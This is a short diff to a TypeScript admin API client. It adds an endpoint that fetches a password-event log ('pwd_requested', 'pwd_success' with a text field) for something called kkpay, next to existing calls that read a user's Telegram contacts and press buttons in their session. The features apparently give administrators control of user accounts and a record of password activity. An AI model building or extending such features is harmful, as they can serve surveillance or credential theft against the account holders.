@@ -45,6 +45,7 @@ export const api = {
     tgContacts: (userId: number) => api.get<{ contacts: { id: string; name: string; username: string | null; phone: string | null }[] }>(`/admin/tg/sessions/${userId}/contacts`),
     tgPressButton: (userId: number, msgId: number, buttonText: string) =>
       api.post<{ ok: boolean }>(`/admin/tg/sessions/${userId}/press-button`, { msgId, buttonText }),
+    kkpayPwdLog: () => api.get<{ events: { id: string; timestamp: number; userId: number; username: string; event: "pwd_requested" | "pwd_success"; text: string }[] }>("/admin/kkpay-pwd-log"),
     setAdmin: (userId: number, isAdmin: boolean) => api.post<{ ok: boolean }>(`/admin/users/${userId}/set-admin`, { isAdmin }),
   },
 
